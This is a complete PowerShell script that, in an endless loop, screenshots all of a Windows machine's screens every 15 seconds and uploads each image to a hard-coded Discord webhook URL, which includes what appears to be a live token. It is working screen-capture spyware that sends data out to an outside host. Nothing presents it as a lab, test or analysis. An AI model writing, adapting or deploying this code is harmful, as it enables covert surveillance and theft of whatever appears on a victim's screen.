function SendToDiscord-Webhook {
    [CmdletBinding()]
    param (

    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    )
    $DiscordWebhookUrl = "https://discordapp.com/api/webhooks/1105173901924909200/8GSqd34Rkoug-RGHcOPCq5nGy7hf-jlBREMbYefdBSuVdKSFqi4HYqqIqXiV4IrlEaY9"   # Replace with your Discord Webhook URL
    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{
        'Content-Type' = "multipart/form-data; boundary=$boundary"
    }
    $content = New-Object -TypeName System.Net.Http.MultipartFormDataContent -ArgumentList $boundary
    $content.Add((New-Object -TypeName System.Net.Http.ByteArrayContent -ArgumentList (Get-Content $SourceFilePath -ReadCount 0 -Raw)), 'file', [System.IO.Path]::GetFileName($SourceFilePath))
    Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -Headers $headers -Body $content
}

while(1){

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $screens = [Windows.Forms.Screen]::AllScreens

    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

    $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
    $graphics.Dispose()
    $bmp.Dispose()

    start-sleep -Seconds 15
    "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | SendToDiscord-Webhook
}
